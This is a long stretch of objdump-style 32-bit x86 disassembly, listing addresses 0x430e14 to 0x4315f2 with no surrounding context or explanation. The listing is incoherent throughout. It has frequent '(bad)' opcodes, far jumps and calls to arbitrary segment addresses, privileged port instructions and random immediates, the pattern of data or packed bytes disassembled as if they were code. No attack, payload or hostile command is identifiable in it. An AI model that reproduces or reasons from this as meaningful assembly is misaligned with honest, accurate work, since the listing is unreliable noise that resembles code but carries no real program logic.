  430e14:	adc    DWORD PTR [eax+0xf69e9d1],eax
  430e1a:	aam    0xc8
  430e1c:	mov    ebx,0x755e09fe
  430e21:	or     bl,al
  430e23:	fidiv  DWORD PTR [edi+ebp*8+0x3b]
  430e27:	test   DWORD PTR ds:0xba9d3e0f,0x9e8b0032
  430e31:	jp     0x430e1f
  430e33:	(bad)  
  430e34:	fcom   st(1)
  430e36:	push   esp
  430e37:	or     al,0xbb
  430e39:	mov    al,0x23
  430e3b:	pop    edx
  430e3c:	addr16 js 0x430e9a
  430e3f:	fcomp  QWORD PTR ds:[edx+0x79fe3913]
  430e46:	stc    
  430e47:	cmp    esi,edx
  430e49:	mov    DWORD PTR [ebp+0x2f33966],0x42ea3cea
  430e53:	pop    ds
  430e54:	sub    DWORD PTR gs:[esi+edx*1+0x76660d1c],ecx
  430e5c:	sub    ecx,DWORD PTR [edi+0x26]
  430e5f:	and    al,0x67
  430e61:	jnp    0x430e66
  430e63:	nop
  430e64:	cmp    bh,0x87
  430e67:	pop    esi
  430e68:	cmp    DWORD PTR [edi-0x64db48b6],0xe0fbe713
  430e72:	adc    edx,DWORD PTR [edx+0x7623b9bd]
  430e78:	add    BYTE PTR [esi],ah
  430e7a:	adc    al,0x82
  430e7c:	es mov ebp,0xf17be0ff
  430e82:	pop    edx
  430e83:	lods   al,BYTE PTR ds:[esi]
  430e84:	in     eax,dx
  430e85:	leave  
  430e86:	jle    0x430ea6
  430e88:	fadd   DWORD PTR [edx+0x3]
  430e8b:	bound  eax,QWORD PTR ds:0x53e3eb7a
  430e91:	and    DWORD PTR [eax],eax
  430e93:	add    BYTE PTR [edx+0x30],ah
  430e96:	js     0x430e24
  430e98:	pop    esi
  430e99:	push   esi
  430e9a:	es cli 
  430e9c:	xor    esi,esp
  430e9e:	sbb    al,0x50
  430ea0:	ins    BYTE PTR es:[edi],dx
  430ea1:	xor    ch,bh
  430ea3:	cs test eax,0x178cd1f2
  430ea9:	int3   
  430eaa:	adc    eax,0xe7d8eabc
  430eaf:	add    esp,edi
  430eb1:	pop    ebx
  430eb2:	out    dx,eax
  430eb3:	sub    DWORD PTR [eax+0x4e2ab745],ebp
  430eb9:	leave  
  430eba:	cmc    
  430ebb:	ret    
  430ebc:	popf   
  430ebd:	fisub  DWORD PTR [edi]
  430ebf:	shl    esi,cl
  430ec1:	pop    ebx
  430ec2:	out    dx,eax
  430ec3:	sub    DWORD PTR [eax+0x16789745],ecx
  430ec9:	dec    ebp
  430eca:	aas    
  430ecb:	xlat   BYTE PTR ds:[ebx]
  430ecc:	jmp    0xa3c6:0x3169e7d8
  430ed3:	add    esp,esi
  430ed5:	sbb    BYTE PTR [ebx+0x5ce8ffe6],bl
  430edb:	and    cl,0x43
  430ede:	add    ch,BYTE PTR [edx]
  430ee0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430ee1:	push   esi
  430ee2:	lods   al,BYTE PTR ds:[esi]
  430ee3:	das    
  430ee4:	inc    ebp
  430ee5:	call   0x5da5124a
  430eea:	daa    
  430eeb:	scas   eax,DWORD PTR es:[edi]
  430eec:	imul   ebp,DWORD PTR [edx+0x4da67739],0xffffffcf
  430ef3:	arpl   dx,bx
  430ef5:	(bad)  
  430ef7:	jg     0x430ef9
  430ef9:	in     eax,0xce
  430efb:	pop    es
  430efc:	sahf   
  430efd:	jno    0x430eae
  430eff:	out    0xd1,eax
  430f01:	sbb    bh,ch
  430f03:	inc    ebx
  430f04:	adc    ah,BYTE PTR [edx-0x28ebc227]
  430f0a:	pop    esi
  430f0b:	arpl   WORD PTR [edx],bp
  430f0d:	clc    
  430f0e:	inc    esp
  430f0f:	aaa    
  430f10:	sar    al,cl
  430f12:	out    dx,al
  430f13:	cmp    edx,DWORD PTR [edx]
  430f15:	mov    ds:0x4d4066d9,al
  430f1a:	pop    es
  430f1b:	scas   eax,DWORD PTR es:[edi]
  430f1c:	ja     0x430f4c
  430f1e:	dec    ebp
  430f1f:	(bad)  
  430f20:	pop    edx
  430f21:	fstp   st(1)
  430f23:	out    0x6d,eax
  430f25:	mov    ebx,0x61e900da
  430f2a:	push   esi
  430f2b:	mov    esp,ebp
  430f2d:	mov    edi,DWORD PTR [edi]
  430f2f:	stc    
  430f30:	das    
  430f31:	popa   
  430f32:	fnstcw WORD PTR [edi]
  430f34:	mov    bl,0xfc
  430f36:	inc    ecx
  430f37:	pop    edx
  430f38:	arpl   WORD PTR [edi],bx
  430f3a:	stos   DWORD PTR es:[edi],eax
  430f3b:	(bad)  
  430f3c:	sub    dl,BYTE PTR [eax-0x23]
  430f3f:	loopne 0x430efe
  430f41:	aad    0x44
  430f43:	add    BYTE PTR [esp+edi*2-0x4a4a4556],dh
  430f4a:	cwde   
  430f4b:	add    BYTE PTR [edi-0x4b312b6],dl
  430f51:	mov    eax,ds:0x41e4f344
  430f56:	enter  0xe944,0x60
  430f5a:	into   
  430f5b:	adc    DWORD PTR [ecx],eax
  430f5d:	add    BYTE PTR [ebx],bh
  430f5f:	aas    
  430f60:	stc    
  430f61:	push   es
  430f62:	loop   0x430ee7
  430f64:	je     0x430f55
  430f66:	out    0xfc,al
  430f68:	in     al,0x7d
  430f6a:	add    eax,0x3569f944
  430f6f:	and    al,0x74
  430f71:	sub    eax,0xde52da5e
  430f76:	pop    esp
  430f77:	cdq    
  430f78:	push   cs
  430f79:	sub    DWORD PTR [esi-0x61],ebx
  430f7c:	mov    eax,0x97cb15
  430f81:	stos   BYTE PTR es:[edi],al
  430f82:	xor    edi,DWORD PTR [esi+0x3c507214]
  430f88:	scas   al,BYTE PTR es:[edi]
  430f89:	mov    dh,0x3a
  430f8b:	aas    
  430f8c:	push   eax
  430f8d:	pop    ss
  430f8e:	dec    ebx
  430f8f:	in     eax,dx
  430f90:	pusha  
  430f91:	jmp    DWORD PTR [ecx]
  430f93:	inc    esp
  430f94:	jle    0x430f3b
  430f96:	cmc    
  430f97:	inc    esi
  430f98:	fdiv   st,st(2)
  430f9a:	mov    eax,ds:0xb6aa5b04
  430f9f:	lods   al,BYTE PTR ds:[esi]
  430fa0:	push   edx
  430fa1:	add    BYTE PTR [ebx+eiz*2+0x31],dh
  430fa5:	xor    ebx,esi
  430fa7:	(bad)  
  430fa8:	repz push ebp
  430faa:	fs (bad) 
  430fac:	lock call DWORD PTR [esi-0x34bff09d]
  430fb3:	les    ebx,FWORD PTR [esp+ebx*2]
  430fb6:	mov    ch,0x17
  430fb8:	stc    
  430fb9:	xor    al,BYTE PTR [edx+0x3e10672f]
  430fbf:	sbb    cl,BYTE PTR [edi]
  430fc1:	sldt   edi
  430fc4:	xchg   esi,eax
  430fc5:	jp     0x430f87
  430fc7:	and    DWORD PTR [ebp+0xd],0x50
  430fcb:	(bad)  
  430fcc:	sbb    BYTE PTR [ecx],al
  430fce:	push   eax
  430fcf:	dec    esp
  430fd0:	lods   eax,DWORD PTR ds:[esi]
  430fd1:	jp     0x430f99
  430fd3:	mov    bl,0x4c
  430fd5:	mov    ecx,0x5ed04783
  430fda:	cmp    DWORD PTR [ebp+0x3cf03d40],ebx
  430fe0:	retf   0x47ff
  430fe3:	adc    esi,DWORD PTR [ebx+0x28]
  430fe6:	xor    DWORD PTR [ebx-0x2d],0x73
  430fea:	inc    esi
  430feb:	loope  0x430fd3
  430fed:	mov    eax,DWORD PTR [esi+0x43]
  430ff0:	daa    
  430ff1:	mov    WORD PTR [edi+0x67],es
  430ff4:	sub    eax,0xbea5d3f6
  430ff9:	inc    edi
  430ffa:	add    bh,BYTE PTR [esi*4-0x635afcc1]
  431001:	loopne 0x43100b
  431003:	mov    BYTE PTR [ecx-0xef99fb],bl
  431009:	pop    edi
  43100a:	mov    DWORD PTR [ecx+ecx*2],edi
  43100d:	loop   0x431031
  43100f:	mov    eax,ds:0x7468bd9
  431014:	daa    
  431015:	mov    WORD PTR [edi-0x11],es
  431018:	es not bl
  43101b:	(bad)
  431020:	and    ebp,DWORD PTR [ebx+0x41]
  431023:	popa   
  431024:	rol    BYTE PTR [ebx-0x20],cl
  431027:	add    BYTE PTR [edx-0x51],bl
  43102a:	inc    eax
  43102b:	or     edi,DWORD PTR [edi+esi*1]
  43102e:	xor    eax,0xe4e3eb61
  431033:	pop    edx
  431034:	adc    al,0x1d
  431036:	(bad)  
  431037:	mov    esi,0x4ed894e1
  43103c:	(bad)  [ecx+ebx*8-0x269b14cd]
  431043:	add    esp,ecx
  431045:	xchg   edi,eax
  431046:	cld    
  431047:	ins    DWORD PTR es:[edi],dx
  431048:	pop    edi
  431049:	(bad)  
  43104a:	xor    eax,0x223528e7
  43104f:	cli    
  431050:	jmp    0x8946e9b9
  431055:	cs out dx,al
  431057:	mov    edi,0x13d97cdb
  43105c:	fcomip st,st(0)
  43105e:	stos   DWORD PTR es:[edi],eax
  43105f:	add    dl,BYTE PTR [eax+0x63781bf0]
  431065:	xor    ch,bh
  431067:	jle    0x43102f
  431069:	sbb    al,0xf1
  43106b:	jmp    eax
  43106d:	push   ebx
  43106e:	fst    DWORD PTR [edi]
  431070:	bound  ebp,QWORD PTR [ebp+0x76]
  431073:	push   0x86ca026a
  431078:	stos   DWORD PTR es:[edi],eax
  431079:	cmp    al,0xfe
  43107b:	jmp    0x7a62:0x1be093e1
  431082:	mov    ecx,0x1c30a223
  431087:	inc    edi
  431088:	arpl   WORD PTR [eax],si
  43108a:	std    
  43108b:	xchg   BYTE PTR [eax],al
  43108d:	sub    eax,0x76202b3f
  431092:	fcom   QWORD PTR [eax]
  431094:	mov    DWORD PTR [esi+0x4dbcbd9],ecx
  43109a:	mov    cl,0x6d
  43109c:	(bad)  
  43109d:	sub    esp,edx
  43109f:	sbb    ebx,DWORD PTR [eax-0x5fec3067]
  4310a5:	call   0x720b:0x570bcbcd
  4310ac:	add    al,0x63
  4310ae:	int3   
  4310af:	mov    eax,0x19cc5de7
  4310b4:	jns    0x43112a
  4310b6:	inc    edx
  4310b7:	sub    sp,WORD PTR [esi-0x36]
  4310bb:	mov    eax,ds:0xf3fd217a
  4310c0:	adc    BYTE PTR [ebp-0x1517292a],0xc4
  4310c7:	imul   ebp,edi,0xffffff84
  4310ca:	fisub  DWORD PTR [edi-0x1a]
  4310cd:	gs int3 
  4310cf:	in     al,dx
  4310d0:	mov    esi,0x2db54434
  4310d5:	jmp    0xa350:0x2dd76bc4
  4310dc:	fisttp WORD PTR [ecx-0x6e]
  4310df:	(bad)  
  4310e0:	jecxz  0x4310c6
  4310e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4310e3:	ret    
  4310e4:	fistp  DWORD PTR [edx-0x28f0343b]
  4310ea:	call   0xe5c4c85d
  4310ef:	mov    bl,0xe9
  4310f1:	add    ah,ah
  4310f3:	sbb    ah,BYTE PTR [eax-0x49]
  4310f6:	and    ebp,0xe981b86e
  4310fc:	jmp    0x71e0:0x2b5320bf
  431103:	cwde   
  431104:	push   cs
  431105:	daa    
  431106:	xchg   DWORD PTR [ebp-0x32],esp
  431109:	or     al,0xe5
  43110b:	dec    eax
  43110c:	into   
  43110d:	adc    ch,bl
  43110f:	dec    eax
  431110:	add    BYTE PTR [esi],ch
  431112:	or     edi,DWORD PTR [esi]
  431114:	or     DWORD PTR [edx+0x35],ebp
  431117:	inc    eax
  431118:	stc    
  431119:	jmp    0xee4a14ff
  43111e:	test   BYTE PTR fs:[eax],al
  431121:	jmp    0xdf3f1987
  431126:	push   ebp
  431127:	mov    WORD PTR [eax],es
  431129:	jmp    0x2705698f
  43112e:	stos   DWORD PTR es:[edi],eax
  43112f:	jle    0x4311a4
  431131:	(bad)
  431135:	fidiv  WORD PTR ds:0x61e90070
  43113b:	add    al,BYTE PTR [ebp+0x5]
  43113e:	push   esi
  43113f:	aam    0x83
  431141:	jae    0x4311a9
  431143:	fld    DWORD PTR [eax]
  431145:	push   edi
  431146:	popa   
  431147:	fimul  DWORD PTR [ecx]
  431149:	ins    BYTE PTR es:[edi],dx
  43114a:	icebp  
  43114b:	inc    eax
  43114c:	stc    
  43114d:	jmp    0xa967adcb
  431152:	jbe    0x4311a9
  431154:	sub    ecx,0xc2d96100
  43115a:	lods   eax,DWORD PTR ds:[esi]
  43115b:	lea    eax,[eax]
  43115d:	add    BYTE PTR [edx],dl
  43115f:	mov    dh,0xbf
  431161:	jl     0x431130
  431163:	imul   ebx,ecx,0xd987da73
  431169:	(bad)  
  43116a:	jnp    0x4311a3
  43116c:	mov    edi,0x9f12e6f5
  431171:	test   DWORD PTR [ebx],ebp
  431173:	sbb    ebx,DWORD PTR [ecx-0x4059dfc]
  431179:	dec    esp
  43117a:	adc    bh,BYTE PTR [eax+0x51]
  43117d:	aas    
  43117e:	icebp  
  43117f:	test   al,0xc1
  431181:	or     al,0x6c
  431183:	stos   BYTE PTR es:[edi],al
  431184:	rol    DWORD PTR [ebx+0xd96164],cl
  43118a:	add    BYTE PTR [eax+0xb],dh
  43118d:	mov    DWORD PTR [ecx],eax
  43118f:	or     BYTE PTR [eax+ecx*4-0x1040f08f],bl
  431196:	jmp    0x43ed5b
  43119b:	js     0x43118e
  43119d:	add    DWORD PTR [edx+0xe],esi
  4311a0:	sar    DWORD PTR ds:0xb9bedf24,0x74
  4311a7:	push   ss
  4311a8:	and    DWORD PTR [ebx+0x19397f3b],edi
  4311ae:	jne    0x43114e
  4311b0:	sub    eax,DWORD PTR [edx+0x4678e3cb]
  4311b6:	inc    DWORD PTR [edi+edi*4-0x47]
  4311ba:	jne    0x4311bc
  4311bc:	scas   al,BYTE PTR es:[edi]
  4311bd:	rol    BYTE PTR [ebp+0x24],0x5f
  4311c1:	ret    0x41c0
  4311c4:	add    cl,BYTE PTR [eax+0x1972241d]
  4311ca:	sbb    eax,0x9cbf9448
  4311cf:	add    BYTE PTR [ebx-0x25],bh
  4311d2:	or     DWORD PTR [edi+ebp*2-0x1b],0xcd5f44f5
  4311da:	xor    ebp,edi
  4311dc:	je     0x431237
  4311de:	test   eax,0x2bf544fe
  4311e3:	rcl    BYTE PTR [edx*1-0x137a4a4],0x25
  4311eb:	ret    0xdb2b
  4311ee:	and    DWORD PTR [ecx+0x3f],esi
  4311f1:	ret    0x244d
  4311f4:	pop    es
  4311f5:	ret    0x2455
  4311f8:	sbb    ebx,DWORD PTR [edx+0x5b]
  4311fb:	or     al,0x3b
  4311fd:	push   eax
  4311fe:	(bad)  
  4311ff:	sub    esi,DWORD PTR [eax-0x2f]
  431202:	and    edi,ebp
  431204:	bound  edi,QWORD PTR [ecx+0x3aeb0792]
  43120a:	mov    WORD PTR [ebp+0x66],fs
  43120d:	sub    DWORD PTR [edi],esi
  43120f:	inc    DWORD PTR ds:0x467b8231
  431215:	and    al,0x3
  431217:	jne    0x431241
  431219:	cld    
  43121a:	cwde   
  43121b:	cmp    ebx,DWORD PTR [ecx+0x46e2dc]
  431221:	outs   dx,BYTE PTR ds:[esi]
  431222:	dec    ecx
  431223:	retf   0x9173
  431226:	sti    
  431227:	cwde   
  431228:	sbb    BYTE PTR [ecx],ch
  43122a:	in     eax,0xdc
  43122c:	xchg   BYTE PTR [esi],ch
  43122e:	or     al,0xed
  431230:	xchg   BYTE PTR [esi],bl
  431232:	adc    al,0xcd
  431234:	and    DWORD PTR es:[edx+ebp*8],ebp
  431238:	jae    0x4312b8
  43123a:	or     BYTE PTR [eax+eax*1-0x18fede25],0x80
  431242:	retf   
  431243:	shl    BYTE PTR [ebx],0x72
  431246:	mov    ebx,0xdb4623c8
  43124b:	rol    DWORD PTR [ebx],0xdb
  43124e:	xor    DWORD PTR [edx-0x1627c1bd],ecx
  431254:	inc    ebx
  431255:	inc    esi
  431256:	aam    0x29
  431258:	pop    es
  431259:	jmp    0x43128c
  43125b:	mov    al,BYTE PTR [ebx+0x46]
  43125e:	sbb    al,0xea
  431260:	mov    ebp,0x2f0171db
  431265:	and    ch,BYTE PTR [ecx]
  431267:	les    eax,FWORD PTR [ebx]
  431269:	gs scas eax,DWORD PTR es:[edi]
  43126b:	inc    esp
  43126c:	call   0xfa60ea48
  431271:	loop   0x43122e
  431273:	loope  0x4312b8
  431275:	bound  edi,QWORD PTR [ebx-0x3b59dc48]
  43127b:	mov    dh,0x86
  43127d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43127e:	(bad)  [ebx]
  431280:	clc    
  431281:	in     al,dx
  431282:	cmp    eax,0x620003e7
  431287:	dec    esp
  431288:	pop    ds
  431289:	add    eax,0x45de6fd
  43128e:	dec    esi
  43128f:	stc    
  431290:	cmp    edx,DWORD PTR [ebx]
  431292:	inc    esi
  431293:	sar    BYTE PTR [ebx],1
  431295:	or     BYTE PTR [esi],bh
  431297:	int3   
  431298:	xor    DWORD PTR [ebx],ecx
  43129a:	imul   edi,DWORD PTR [edi-0x59],0x4c3acde
  4312a1:	lds    ebp,FWORD PTR [edi+ecx*1]
  4312a4:	adc    eax,0x5de6c42a
  4312a9:	or     DWORD PTR [esi-0x71ecec07],edx
  4312af:	rol    BYTE PTR [ebx],1
  4312b1:	or     BYTE PTR [esi+0x690af9cc],al
  4312b7:	jg     0x431260
  4312b9:	fdivrp st(4),st
  4312bb:	ret    
  4312bc:	in     al,0xd1
  4312be:	je     0x431308
  4312c0:	(bad)  
  4312c1:	sub    esp,ebx
  4312c3:	pushf  
  4312c4:	add    esi,esp
  4312c6:	in     al,0x17
  4312c8:	inc    dh
  4312ca:	popa   
  4312cb:	repnz pop eax
  4312cd:	leave  
  4312ce:	fcmovu st,st(2)
  4312d0:	jo     0x431267
  4312d2:	popa   
  4312d3:	xor    ah,bl
  4312d5:	mov    ds,WORD PTR [ecx]
  4312d7:	cmc    
  4312d8:	xlat   BYTE PTR ds:[ebx]
  4312d9:	mov    fs,WORD PTR [ecx]
  4312db:	cmc    
  4312dc:	(bad)  
  4312dd:	out    dx,al
  4312de:	sub    al,0xd5
  4312e0:	into   
  4312e1:	lahf   
  4312e2:	inc    ecx
  4312e3:	icebp  
  4312e4:	jo     0x4312ab
  4312e6:	gs push edx
  4312e8:	lea    ecx,[edi]
  4312ea:	add    BYTE PTR [edx],dl
  4312ec:	fild   DWORD PTR [eax]
  4312ee:	sbb    cl,BYTE PTR [ebx+0x3d]
  4312f1:	add    bh,BYTE PTR [ecx-0x2e91b524]
  4312f7:	imul   edx,DWORD PTR [esi+0x0],0xf9e3cd20
  4312fe:	jne    0x431345
  431300:	aad    0xe8
  431302:	inc    ebx
  431303:	stos   BYTE PTR es:[edi],al
  431304:	cmp    al,0xf9
  431306:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  431308:	lds    eax,FWORD PTR [ebx+ebx*1]
  43130b:	sahf   
  43130c:	xor    ebx,DWORD PTR [ecx]
  43130e:	bound  ebx,QWORD PTR [eax]
  431310:	rol    DWORD PTR [ebp+0x49ad8e9],1
  431316:	shl    bh,cl
  431318:	push   ebx
  431319:	push   edx
  43131a:	loope  0x43137a
  43131c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43131d:	and    al,0xe1
  43131f:	fcom   QWORD PTR [edx-0x2ff26efc]
  431325:	add    cl,ch
  431327:	in     eax,0x7c
  431329:	je     0x4312e1
  43132b:	fstp   DWORD PTR cs:[edx-0x55]
  43132f:	pop    edx
  431330:	fnstcw WORD PTR [ebp-0x6b]
  431333:	into   
  431334:	dec    ebp
  431335:	add    al,0xc5
  431337:	test   BYTE PTR [esi+eiz*2+0x673d07e9],0xe6
  43133f:	fisub  WORD PTR [ecx]
  431341:	call   0xf98295ac
  431346:	gs es iret 
  431349:	test   BYTE PTR [ebx+0x5e],dh
  43134c:	fld    DWORD PTR [eax]
  43134e:	mov    dh,0x0
  431350:	faddp  st(0),st
  431352:	and    al,0x11
  431354:	fnstsw WORD PTR [edi]
  431356:	ja     0x43134a
  431358:	out    dx,al
  431359:	nop
  43135a:	and    al,0xd
  43135c:	inc    esi
  43135d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43135e:	(bad)  
  43135f:	sub    eax,0x72f85343
  431364:	call   0xf955:0x97da20f8
  43136b:	mov    esp,0xddff8ee4
  431370:	xor    ch,BYTE PTR [ecx]
  431372:	mov    eax,DWORD PTR [eax]
  431374:	repz aam 0xf9
  431377:	jmp    0xffc77f5f
  43137c:	mov    bl,0x70
  43137e:	push   esp
  43137f:	mov    eax,DWORD PTR [eax+0x3cff66ed]
  431385:	stc    
  431386:	jge    0x431348
  431388:	mov    bh,0x19
  43138a:	add    BYTE PTR [ebx+0x3],0x82
  43138e:	xor    BYTE PTR [edi+eiz*2+0x3d],0xfa
  431393:	jb     0x43138c
  431395:	sub    al,0xbf
  431397:	add    ecx,DWORD PTR [eax-0x2f]
  43139a:	push   eax
  43139b:	lea    eax,[edi]
  43139d:	dec    edx
  43139e:	dec    edi
  43139f:	push   eax
  4313a0:	mov    esp,0x3b166142
  4313a5:	aad    0xf5
  4313a7:	je     0x431350
  4313a9:	and    esi,esi
  4313ab:	je     0x431354
  4313ad:	and    ecx,DWORD PTR [edi-0x1]
  4313b0:	(bad)  
  4313b1:	jnp    0x4313c2
  4313b3:	inc    eax
  4313b4:	add    BYTE PTR [ebx-0x74db8b2c],bh
  4313ba:	push   esi
  4313bb:	mov    ebp,0x32d20518
  4313c0:	inc    esi
  4313c1:	inc    esi
  4313c2:	stc    
  4313c3:	ja     0x4313da
  4313c5:	in     al,0xf8
  4313c7:	ins    DWORD PTR es:[edi],dx
  4313c8:	and    al,0x7b
  4313ca:	(bad)  
  4313cb:	call   FWORD PTR [edi]
  4313cd:	lds    eax,FWORD PTR [ecx+0x41bf15f6]
  4313d3:	cmp    DWORD PTR [eax],eax
  4313d5:	clc    
  4313d6:	xchg   ebx,eax
  4313d7:	add    eax,0xbe723403
  4313dc:	push   es
  4313dd:	jle    0x4313ac
  4313df:	jmp    FWORD PTR [edx-0x7d]
  4313e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4313e3:	add    BYTE PTR [esi+0x50],bl
  4313e6:	(bad)  
  4313e7:	sub    al,al
  4313e9:	push   ds
  4313ea:	sbb    dl,BYTE PTR [edx-0x7d]
  4313ed:	(bad)  
  4313ee:	in     al,dx
  4313ef:	in     eax,dx
  4313f0:	mov    ebp,0x86b23076
  4313f5:	ss mov al,0x29
  4313f8:	pxor   mm6,QWORD PTR [ebp+0xd]
  4313fc:	push   ecx
  4313fd:	xchg   edx,eax
  4313fe:	inc    ebx
  4313ff:	xchg   ebx,eax
  431400:	or     ebx,ecx
  431402:	inc    ecx
  431403:	lods   al,BYTE PTR ds:[esi]
  431404:	jmp    DWORD PTR [esi+ebx*4]
  431407:	or     al,0xe8
  431409:	pop    esi
  43140a:	sbb    al,0x19
  43140c:	cli    
  43140d:	fidiv  WORD PTR [eax-0x68]
  431410:	fld    DWORD PTR ds:0x2caffe1d
  431417:	xchg   BYTE PTR [ecx+0x0],al
  43141a:	push   0xffffffdf
  43141c:	test   DWORD PTR [esi+esi*8-0x25],ebx
  431420:	(bad)  
  431421:	cmp    edx,DWORD PTR [ecx-0x29]
  431424:	inc    ecx
  431425:	(bad)  
  431426:	lahf   
  431427:	sub    al,0x91
  431429:	or     esi,DWORD PTR [edx]
  43142b:	add    ebp,DWORD PTR [edi-0xcfb9006]
  431431:	aas    
  431432:	bound  ebp,QWORD PTR [edi-0xd84f4b8]
  431438:	or     al,0x87
  43143a:	sub    al,0x2c
  43143c:	mov    edx,0x9879df56
  431441:	adc    BYTE PTR [ebx],dl
  431443:	stos   DWORD PTR es:[edi],eax
  431444:	xchg   edx,eax
  431445:	pop    es
  431446:	mov    edx,0x9dff6e38
  43144b:	mov    edx,0x8c30e90b
  431451:	inc    ecx
  431452:	pushaw 
  431454:	add    ebx,DWORD PTR [edx-0x65]
  431457:	out    dx,al
  431458:	or     al,0x0
  43145a:	pop    ss
  43145b:	(bad)  
  43145c:	xor    BYTE PTR [esi-0x7a],bh
  43145f:	and    BYTE PTR [eax-0x529d8dbc],dl
  431465:	gs (bad) 
  431467:	(bad)  [ebp-0x103ba6fc]
  43146d:	mov    dl,BYTE PTR [edx+0x31]
  431470:	cmp    bl,BYTE PTR [ebx]
  431472:	dec    eax
  431473:	cmp    ah,BYTE PTR [ebx+0x44]
  431476:	into   
  431477:	aad    0xb6
  431479:	inc    ebx
  43147a:	inc    esp
  43147b:	retf   
  43147c:	outs   dx,BYTE PTR ds:[esi]
  43147d:	rol    DWORD PTR [eax],1
  43147f:	imul   ecx,DWORD PTR [esi-0x54],0x5ed7da17
  431486:	(bad)  
  431487:	popa   
  431488:	(bad)  
  431489:	sub    al,0x14
  43148b:	mov    ebx,0x620fa510
  431490:	push   esi
  431491:	ret    
  431492:	div    DWORD PTR [eax+0x5de8234c]
  431498:	test   eax,0xafad43f6
  43149d:	call   0x3885c0
  4314a2:	mov    ch,dl
  4314a4:	dec    edi
  4314a5:	and    ebp,eax
  4314a7:	push   ecx
  4314a8:	xor    DWORD PTR [edx+0x6339d81a],eax
  4314ae:	inc    ebx
  4314af:	push   0x62035655
  4314b4:	fstp   DWORD PTR [esi-0x31]
  4314b7:	xor    ebp,0xd8b82c19
  4314bd:	jp     0x4314dd
  4314bf:	fmul   QWORD PTR [eax+0x6c]
  4314c2:	adc    eax,0x43b5d22a
  4314c7:	mov    edx,0x6203e75d
  4314cc:	dec    esi
  4314cd:	mov    ds:0xc34e2f07,al
  4314d2:	out    0x5d,eax
  4314d4:	pop    ecx
  4314d5:	retf   
  4314d6:	jmp    0x431460
  4314d8:	(bad)  
  4314d9:	mov    esp,0x394a005
  4314de:	adc    BYTE PTR [ebx-0x6d],ah
  4314e1:	add    BYTE PTR [edx+0x0],ah
  4314e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4314e5:	cmc    
  4314e6:	adc    al,0x9a
  4314e8:	fcomp  DWORD PTR [esi+0x3799d208]
  4314ee:	fnclex 
  4314f0:	jno    0x4314a4
  4314f2:	adc    esp,DWORD PTR [edx-0x60]
  4314f5:	inc    DWORD PTR [ecx-0x1f]
  4314f8:	fsub   DWORD PTR [ebx]
  4314fa:	push   eax
  4314fb:	adc    DWORD PTR [ebp+0x35],ebx
  4314fe:	stc    
  4314ff:	(bad)  
  431500:	fdivr  QWORD PTR [eax+0x74]
  431503:	mov    bl,al
  431505:	pushf  
  431506:	and    al,0xd1
  431508:	fmul   DWORD PTR [ebx+0x37727404]
  43150e:	xchg   BYTE PTR [esi],ah
  431510:	data16 cmp ah,cl
  431513:	add    ah,BYTE PTR [ecx+0x1155bf37]
  431519:	test   eax,0x8a0bed8b
  43151e:	std    
  43151f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431520:	scas   al,BYTE PTR es:[edi]
  431521:	xor    edx,DWORD PTR [ebx]
  431523:	inc    ecx
  431524:	hlt    
  431525:	clc    
  431526:	add    BYTE PTR [edx-0x66],ch
  431529:	in     al,0x80
  43152b:	and    eax,0x1500e8ca
  431530:	imul   esp,DWORD PTR [eax+0x41],0x28dc27ed
  431537:	leave  
  431538:	pushf  
  431539:	mov    ds:0xccdc7f83,al
  43153e:	test   DWORD PTR [esi],esp
  431540:	push   0xffffff8b
  431542:	stc    
  431543:	std    
  431544:	(bad)
  431547:	mov    ds:0x1333ee00,eax
  43154c:	lds    edx,FWORD PTR [edi+0x2a6a00f8]
  431552:	in     al,0x85
  431554:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431555:	pop    ebp
  431556:	bound  ebx,QWORD PTR [ecx-0x1f]
  431559:	fsub   QWORD PTR [ecx]
  43155b:	je     0x43155d
  43155d:	jb     0x4315ca
  43155f:	dec    edx
  431560:	call   0x3cc004
  431565:	and    bl,bl
  431567:	mov    al,0x1
  431569:	shl    BYTE PTR [edi+0x57],1
  43156c:	pop    edi
  43156d:	enter  0xda1,0xc2
  431571:	pop    ebx
  431572:	fdivr  QWORD PTR [edi-0x14]
  431575:	dec    edi
  431576:	fild   DWORD PTR [eax]
  431578:	add    BYTE PTR [esi-0x27fbe2df],ah
  43157e:	outs   dx,BYTE PTR ds:[esi]
  43157f:	dec    edi
  431580:	push   edi
  431581:	fisubr DWORD PTR [ebx+0x61]
  431584:	enter  0x1d9f,0xf9
  431588:	out    0x48,eax
  43158a:	xlat   BYTE PTR ds:[ebx]
  43158b:	idiv   bh
  43158d:	nop
  43158e:	int3   
  43158f:	test   dh,dh
  431591:	add    al,0x60
  431593:	ret    
  431594:	add    bl,bh
  431596:	fild   DWORD PTR [ecx+0x7a315f7c]
  43159c:	dec    DWORD PTR ds:0xbbd86e5
  4315a2:	fadd   QWORD PTR [eax]
  4315a4:	push   0xfffffffd
  4315a6:	pusha  
  4315a7:	iret   
  4315a8:	mov    ecx,0x39bfd3
  4315ad:	add    bl,dh
  4315af:	xchg   edx,eax
  4315b0:	inc    edx
  4315b1:	push   esp
  4315b3:	pop    esi
  4315b4:	mov    ecx,0xf9bd3e0f
  4315b9:	(bad)  
  4315ba:	mov    ebx,0xf8370d66
  4315bf:	lock mov WORD PTR [esi-0x43],cs
  4315c3:	add    BYTE PTR [ecx],bl
  4315c5:	mov    bh,BYTE PTR [edx-0x768be6e9]
  4315cb:	pop    ss
  4315cc:	or     BYTE PTR [edi+ecx*4+0x17],bh
  4315d0:	or     al,0x7e
  4315d2:	xchg   ecx,eax
  4315d3:	in     al,0xb6
  4315d5:	shl    BYTE PTR [edx-0x33],0x1b
  4315d9:	inc    DWORD PTR [ebp+0x23049241]
  4315df:	fild   DWORD PTR [esi+0x6d]
  4315e2:	add    esp,0x525623c1
  4315e8:	call   0x8a9426bd
  4315ed:	dec    ebx
  4315ee:	xchg   BYTE PTR [esp+eax*2],ah
  4315f1:	inc    ebx
  4315f2:	jle    0x431610
